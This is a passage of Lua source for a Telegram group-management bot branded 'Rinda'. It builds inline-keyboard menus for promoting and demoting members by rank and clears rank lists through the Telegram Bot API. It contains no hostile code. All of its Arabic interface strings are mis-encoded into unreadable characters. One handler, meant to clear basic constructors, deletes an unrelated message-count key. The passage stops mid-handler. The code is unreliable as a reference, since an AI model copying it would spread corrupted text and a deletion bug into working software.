keyboard.inline_keyboard = {{{text="โข ุฑูุน ูููุฒ โข",callback_data=data.sender_user_id_..":SetMem:"..Rio},{text="โข ุฑูุน ุงุฏูู โข",callback_data=data.sender_user_id_..":SetAdmin:"..Rio}},{{text="โข ุฑูุน ููุดุฆ โข",callback_data=data.sender_user_id_..":SetConstructor:"..Rio},{text="โข ุฑูุน ูุฏูุฑ โข",callback_data=data.sender_user_id_..":SetManager:"..Rio}},{{text="โข ุฑูุน ููุธู โข",callback_data=data.sender_user_id_..":SetCleaner:"..Rio}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif Constructor(data) then
keyboard.inline_keyboard = {{{text="โข ุฑูุน ูููุฒ โข",callback_data=data.sender_user_id_..":SetMem:"..Rio},{text="โข ุฑูุน ุงุฏูู โข",callback_data=data.sender_user_id_..":SetAdmin:"..Rio}},{{text="โข ุฑูุน ููุธู โข",callback_data=data.sender_user_id_..":SetCleaner:"..Rio},{text="โข ุฑูุน ูุฏูุฑ โข",callback_data=data.sender_user_id_..":SetManager:"..Rio}},{{text = 'โข Rinda TeAM โข',url="t.me/Source_Rinda"}}}
elseif Manager(data) then
keyboard.inline_keyboard = {{{text="โข ุฑูุน ูููุฒ โข",callback_data=data.sender_user_id_..":SetMem:"..Rio},{text="โข ุฑูุน ุงุฏูู โข",callback_data=data.sender_user_id_..":SetAdmin:"..Rio}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif Admin(data) then
keyboard.inline_keyboard = {{{text="โข ุฑูุน ูููุฒ โข",callback_data=data.sender_user_id_..":SetMem:"..Rio}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
end
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match(tonumber(data.sender_user_id_)..':RemList:(.*)') then
local Rio = DataText:match(tonumber(data.sender_user_id_)..':RemList:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = Rio},function(arg,dp) 
if dp.first_name_ == false then
Dev_Rio(data.chat_id_, data.id_, 1, "โ๏ธฐุงูุญุณุงุจ ูุญุฐูู", 1, "md")
return false  
end
local Text = 'โ๏ธฐูู ุจุงุณุชุนูุงู ุงูุงุฒุฑุงุฑ ูุชูุฒูู ุงูุนุถู โข โค\nโ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')'
keyboard = {} 
if Sudo(data) then
keyboard.inline_keyboard = {{{text="โข ุชูุฒูู ูููุฒ โข",callback_data=data.sender_user_id_..":RemMem:"..Rio},{text="โข ุชูุฒูู ุงุฏูู โข",callback_data=data.sender_user_id_..":RemAdmin:"..Rio}},{{text="โข ุชูุฒูู ููุดุฆ โข",callback_data=data.sender_user_id_..":RemConstructor:"..Rio},{text="โข ุชูุฒูู ูุฏูุฑ โข",callback_data=data.sender_user_id_..":RemManager:"..Rio}},{{text="โข ุชูุฒูู ููุธู โข",callback_data=data.sender_user_id_..":RemCleaner:"..Rio},{text="โข ุชูุฒูู ููุดุฆ  ุงุณุงุณู โข",callback_data=data.sender_user_id_..":RemBasicConstructor:"..Rio}},{{text="โข ุชูุฒูู ูุงูู โข",callback_data=data.sender_user_id_..":RemOwner:"..Rio},{text="โข ุชูุฒูู ูุทูุฑ โข",callback_data=data.sender_user_id_..":RemSudoBot:"..Rio}},{{text="โข ุชูุฒูู ูุทูุฑ ุซุงููู โข",callback_data=data.sender_user_id_..":RemSecondSudo:"..Rio},{text="โข ุชูุฒูู ูุทูุฑ ุงุณุงุณู โข",callback_data=data.sender_user_id_..":RemRioSudo:"..Rio}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif RioSudo(data) then
keyboard.inline_keyboard = {{{text="โข ุชูุฒูู ูููุฒ โข",callback_data=data.sender_user_id_..":RemMem:"..Rio},{text="โข ุชูุฒูู ุงุฏูู โข",callback_data=data.sender_user_id_..":RemAdmin:"..Rio}},{{text="โข ุชูุฒูู ููุดุฆ โข",callback_data=data.sender_user_id_..":RemConstructor:"..Rio},{text="โข ุชูุฒูู ูุฏูุฑ โข",callback_data=data.sender_user_id_..":RemManager:"..Rio}},{{text="โข ุชูุฒูู ููุธู โข",callback_data=data.sender_user_id_..":RemCleaner:"..Rio},{text="โข ุชูุฒูู ููุดุฆ  ุงุณุงุณู โข",callback_data=data.sender_user_id_..":RemBasicConstructor:"..Rio}},{{text="โข ุชูุฒูู ูุงูู โข",callback_data=data.sender_user_id_..":RemOwner:"..Rio},{text="โข ุชูุฒูู ูุทูุฑ โข",callback_data=data.sender_user_id_..":RemSudoBot:"..Rio}},{{text="โข ุชูุฒูู ูุทูุฑ ุซุงููู โข",callback_data=data.sender_user_id_..":RemSecondSudo:"..Rio}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif SecondSudo(data) then
keyboard.inline_keyboard = {{{text="โข ุชูุฒูู ูููุฒ โข",callback_data=data.sender_user_id_..":RemMem:"..Rio},{text="โข ุชูุฒูู ุงุฏูู โข",callback_data=data.sender_user_id_..":RemAdmin:"..Rio}},{{text="โข ุชูุฒูู ููุดุฆ โข",callback_data=data.sender_user_id_..":RemConstructor:"..Rio},{text="โข ุชูุฒูู ูุฏูุฑ โข",callback_data=data.sender_user_id_..":RemManager:"..Rio}},{{text="โข ุชูุฒูู ููุธู โข",callback_data=data.sender_user_id_..":RemCleaner:"..Rio},{text="โข ุชูุฒูู ููุดุฆ  ุงุณุงุณู โข",callback_data=data.sender_user_id_..":RemBasicConstructor:"..Rio}},{{text="โข ุชูุฒูู ูุงูู โข",callback_data=data.sender_user_id_..":RemOwner:"..Rio},{text="โข ุชูุฒูู ูุทูุฑ โข",callback_data=data.sender_user_id_..":RemSudoBot:"..Rio}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif SudoBot(data) then
keyboard.inline_keyboard = {{{text="โข ุชูุฒูู ูููุฒ โข",callback_data=data.sender_user_id_..":RemMem:"..Rio},{text="โข ุชูุฒูู ุงุฏูู โข",callback_data=data.sender_user_id_..":RemAdmin:"..Rio}},{{text="โข ุชูุฒูู ููุดุฆ โข",callback_data=data.sender_user_id_..":RemConstructor:"..Rio},{text="โข ุชูุฒูู ูุฏูุฑ โข",callback_data=data.sender_user_id_..":RemManager:"..Rio}},{{text="โข ุชูุฒูู ููุธู โข",callback_data=data.sender_user_id_..":RemCleaner:"..Rio},{text="โข ุชูุฒูู ููุดุฆ  ุงุณุงุณู โข",callback_data=data.sender_user_id_..":RemBasicConstructor:"..Rio}},{{text="โข ุชูุฒูู ูุงูู โข",callback_data=data.sender_user_id_..":RemOwner:"..Rio}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif Owner(data) then
keyboard.inline_keyboard = {{{text="โข ุชูุฒูู ูููุฒ โข",callback_data=data.sender_user_id_..":RemMem:"..Rio},{text="โข ุชูุฒูู ุงุฏูู โข",callback_data=data.sender_user_id_..":RemAdmin:"..Rio}},{{text="โข ุชูุฒูู ููุดุฆ โข",callback_data=data.sender_user_id_..":RemConstructor:"..Rio},{text="โข ุชูุฒูู ูุฏูุฑ โข",callback_data=data.sender_user_id_..":RemManager:"..Rio}},{{text="โข ุชูุฒูู ููุธู โข",callback_data=data.sender_user_id_..":RemCleaner:"..Rio},{text="โข ุชูุฒูู ููุดุฆ  ุงุณุงุณู โข",callback_data=data.sender_user_id_..":RemBasicConstructor:"..Rio}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif BasicConstructor(data) then
keyboard.inline_keyboard = {{{text="โข ุชูุฒูู ูููุฒ โข",callback_data=data.sender_user_id_..":RemMem:"..Rio},{text="โข ุชูุฒูู ุงุฏูู โข",callback_data=data.sender_user_id_..":RemAdmin:"..Rio}},{{text="โข ุชูุฒูู ููุดุฆ โข",callback_data=data.sender_user_id_..":RemConstructor:"..Rio},{text="โข ุชูุฒูู ูุฏูุฑ โข",callback_data=data.sender_user_id_..":RemManager:"..Rio}},{{text="โข ุชูุฒูู ููุธู โข",callback_data=data.sender_user_id_..":RemCleaner:"..Rio}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif Constructor(data) then
keyboard.inline_keyboard = {{{text="โข ุชูุฒูู ูููุฒ โข",callback_data=data.sender_user_id_..":RemMem:"..Rio},{text="โข ุชูุฒูู ุงุฏูู โข",callback_data=data.sender_user_id_..":RemAdmin:"..Rio}},{{text="โข ุชูุฒูู ููุธู โข",callback_data=data.sender_user_id_..":RemCleaner:"..Rio},{text="โข ุชูุฒูู ูุฏูุฑ โข",callback_data=data.sender_user_id_..":RemManager:"..Rio}},{{text = 'โข Rinda TeAM โข',url="t.me/Source_Rinda"}}}
elseif Manager(data) then
keyboard.inline_keyboard = {{{text="โข ุชูุฒูู ูููุฒ โข",callback_data=data.sender_user_id_..":RemMem:"..Rio},{text="โข ุชูุฒูู ุงุฏูู โข",callback_data=data.sender_user_id_..":RemAdmin:"..Rio}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif Admin(data) then
keyboard.inline_keyboard = {{{text="โข ุชูุฒูู ูููุฒ โข",callback_data=data.sender_user_id_..":RemMem:"..Rio}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
end
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match('/DelList:(.*)') then
local Rio = DataText:match('/DelList:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Del = DevRio:get(Rinda..'Rio:Del')
local Text = [[
โ๏ธฐุงููุง ุจู ูู ูุงุฆูุฉ ุงูุงูุฑ ุงูุฑุชุจ โขโฏ
-----------------------------------------
*โ๏ธฐููููู ูุณุญ ุฑุชุจ ุงููุฌููุนู ูู ุฎูุงู ุงูุงุฒุฑุงุฑ ุงุณูู*
-----------------------------------------
โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]] 
keyboard = {} 
if Sudo(data) then
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงูุงุณุงุณููู โข",callback_data="/DelRioSudo:"..data.sender_user_id_},{text="โข ูุณุญ ุงูุซุงููููู โข",callback_data="/DelSecondSudo:"..data.sender_user_id_}},{{text="โข ูุณุญ ุงููุทูุฑูู โข",callback_data="/DelSudoBot:"..data.sender_user_id_},{text="โข ูุณุญ ุงููุงูููู โข",callback_data="/DelOwner:"..data.sender_user_id_}},{{text="โข ูุณุญ ุงูููุดุฆูู ุงูุงุณุงุณููู โข",callback_data="/DelBasicConstructor:"..data.sender_user_id_},{text="โข ูุณุญ ุงูููุดุฆูู โข",callback_data="/DelConstructor:"..data.sender_user_id_}},{{text="โข ูุณุญ ุงููุฏุฑุงุก โข",callback_data="/DelManagers:"..data.sender_user_id_},{text="โข ูุณุญ ุงูุงุฏูููู โข",callback_data="/DelAdmins:"..data.sender_user_id_}},{{text="โข ูุณุญ ุงููููุฒูู โข",callback_data="/DelVipMem:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif RioSudo(data) then
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงูุซุงููููู โข",callback_data="/DelSecondSudo:"..data.sender_user_id_}},{{text="โข ูุณุญ ุงููุทูุฑูู โข",callback_data="/DelSudoBot:"..data.sender_user_id_},{text="โข ูุณุญ ุงููุงูููู โข",callback_data="/DelOwner:"..data.sender_user_id_}},{{text="โข ูุณุญ ุงูููุดุฆูู ุงูุงุณุงุณููู โข",callback_data="/DelBasicConstructor:"..data.sender_user_id_},{text="โข ูุณุญ ุงูููุดุฆูู โข",callback_data="/DelConstructor:"..data.sender_user_id_}},{{text="โข ูุณุญ ุงููุฏุฑุงุก โข",callback_data="/DelManagers:"..data.sender_user_id_},{text="โข ูุณุญ ุงูุงุฏูููู โข",callback_data="/DelAdmins:"..data.sender_user_id_}},{{text="โข ูุณุญ ุงููููุฒูู โข",callback_data="/DelVipMem:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif SecondSudo(data) then
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงููุทูุฑูู โข",callback_data="/DelSudoBot:"..data.sender_user_id_},{text="โข ูุณุญ ุงููุงูููู โข",callback_data="/DelOwner:"..data.sender_user_id_}},{{text="โข ูุณุญ ุงูููุดุฆูู ุงูุงุณุงุณููู โข",callback_data="/DelBasicConstructor:"..data.sender_user_id_},{text="โข ูุณุญ ุงูููุดุฆูู โข",callback_data="/DelConstructor:"..data.sender_user_id_}},{{text="โข ูุณุญ ุงููุฏุฑุงุก โข",callback_data="/DelManagers:"..data.sender_user_id_},{text="โข ูุณุญ ุงูุงุฏูููู โข",callback_data="/DelAdmins:"..data.sender_user_id_}},{{text="โข ูุณุญ ุงููููุฒูู โข",callback_data="/DelVipMem:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif SudoBot(data) then
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงููุงูููู โข",callback_data="/DelOwner:"..data.sender_user_id_}},{{text="โข ูุณุญ ุงูููุดุฆูู ุงูุงุณุงุณููู โข",callback_data="/DelBasicConstructor:"..data.sender_user_id_},{text="โข ูุณุญ ุงูููุดุฆูู โข",callback_data="/DelConstructor:"..data.sender_user_id_}},{{text="โข ูุณุญ ุงููุฏุฑุงุก โข",callback_data="/DelManagers:"..data.sender_user_id_},{text="โข ูุณุญ ุงูุงุฏูููู โข",callback_data="/DelAdmins:"..data.sender_user_id_}},{{text="โข ูุณุญ ุงููููุฒูู โข",callback_data="/DelVipMem:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif Owner(data) then
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงูููุดุฆูู ุงูุงุณุงุณููู โข",callback_data="/DelBasicConstructor:"..data.sender_user_id_},{text="โข ูุณุญ ุงูููุดุฆูู โข",callback_data="/DelConstructor:"..data.sender_user_id_}},{{text="โข ูุณุญ ุงููุฏุฑุงุก โข",callback_data="/DelManagers:"..data.sender_user_id_},{text="โข ูุณุญ ุงูุงุฏูููู โข",callback_data="/DelAdmins:"..data.sender_user_id_}},{{text="โข ูุณุญ ุงููููุฒูู โข",callback_data="/DelVipMem:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif BasicConstructor(data) then
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงูููุดุฆูู โข",callback_data="/DelConstructor:"..data.sender_user_id_}},{{text="โข ูุณุญ ุงููุฏุฑุงุก โข",callback_data="/DelManagers:"..data.sender_user_id_},{text="โข ูุณุญ ุงูุงุฏูููู โข",callback_data="/DelAdmins:"..data.sender_user_id_}},{{text="โข ูุณุญ ุงููููุฒูู โข",callback_data="/DelVipMem:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif Constructor(data) then
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงููุฏุฑุงุก โข",callback_data="/DelManagers:"..data.sender_user_id_},{text="โข ูุณุญ ุงูุงุฏูููู โข",callback_data="/DelAdmins:"..data.sender_user_id_}},{{text="โข ูุณุญ ุงููููุฒูู โข",callback_data="/DelVipMem:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif Manager(data) then
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงูุงุฏูููู โข",callback_data="/DelAdmins:"..data.sender_user_id_}},{{text="โข ูุณุญ ุงููููุฒูู โข",callback_data="/DelVipMem:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif Admin(data) then
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุงููููุฒูู โข",callback_data="/DelVipMem:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
end
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
if Sudo(data) then
if DataText and DataText:match('/DelRioSudo:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelRioSudo:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda..'Rio:RioSudo:')
Text = "*โ๏ธฐุชู ุญุฐู ุงูุงุณุงุณููู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
if RioSudo(data) then
if DataText and DataText:match('/DelSecondSudo:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelSecondSudo:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda..'Rio:SecondSudo:')
Text = "*โ๏ธฐุชู ุญุฐู ุงูุซุงููููู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
if SecondSudo(data) then
if DataText and DataText:match('/DelSudoBot:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelSudoBot:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda..'Rio:SudoBot:')
Text = "*โ๏ธฐุชู ุญุฐู ุงููุทูุฑูู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
if SudoBot(data) then
if DataText and DataText:match('/DelOwner:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelOwner:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda..'Rio:Owner:'..data.chat_id_)
Text = "*โ๏ธฐุชู ุญุฐู ุงููุงูููู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
if Owner(data) then
if DataText and DataText:match('/DelBasicConstructor:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelBasicConstructor:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda..'Rio:UsersMsgs'..data.chat_id_..':'..data.sender_user_id_)
Text = "*โ๏ธฐุชู ุญุฐู ุงูููุดุฆูู ุงูุงุณุงุณููู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
if BasicConstructor(data) then
if DataText and DataText:match('/DelConstructor:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelConstructor:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda..'Rio:Constructor:'..data.chat_id_)
Text = "*โ๏ธฐุชู ุญุฐู ุงูููุดุฆูู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
if Constructor(data) then
if DataText and DataText:match('/DelManager:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelManager:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda..'Rio:Managers:'..data.chat_id_)
Text = "*โ๏ธฐุชู ุญุฐู ุงููุฏุฑุงุก*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
if Manager(data) then
if DataText and DataText:match('/DelAdmins:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelAdmins:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda..'Rio:Admins:'..data.chat_id_)
Text = "*โ๏ธฐุชู ุญุฐู ุงูุงุฏูููู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
if Admin(data) then
if DataText and DataText:match('/DelVipMem:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelVipMem:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda..'Rio:VipMem:'..data.chat_id_)
Text = "*โ๏ธฐุชู ุญุฐู ุงููููุฒูู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
if RioConstructor(data) then
if DataText and DataText:match('/DelCleanr:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelCleanr:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda..'Rio:Cleaner:'..data.chat_id_)
Text = "*โ๏ธฐุชู ุญุฐู ุงูููุธููู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุงููุงุฆูู ุงูุฑุฆูุณูู โข",callback_data="/DelList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
if Admin(data) then
if DataText and DataText:match('/DelMute:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelMute:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda..'Rio:Muted:'..data.chat_id_)
Text = "*โ๏ธฐุชู ุญุฐู ุงูููุชูููู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/DelKeed:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelKeed:'..tonumber(data.sender_user_id_)..'(.*)')
local List = DevRio:smembers(Rinda..'Rio:Tkeed:'..data.chat_id_)
for k,v in pairs(List) do   
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..data.chat_id_.."&user_id="..v.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
DevRio:srem(Rinda..'Rio:Tkeed:'..data.chat_id_, v)
end
Text = "*โ๏ธฐุชู ุญุฐู ุงููููุฏูู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/DelBan:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelBan:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda..'Rio:Ban:'..data.chat_id_)
Text = "*โ๏ธฐุชู ุญุฐู ุงููุญุธูุฑูู*"
keyboard = {} 
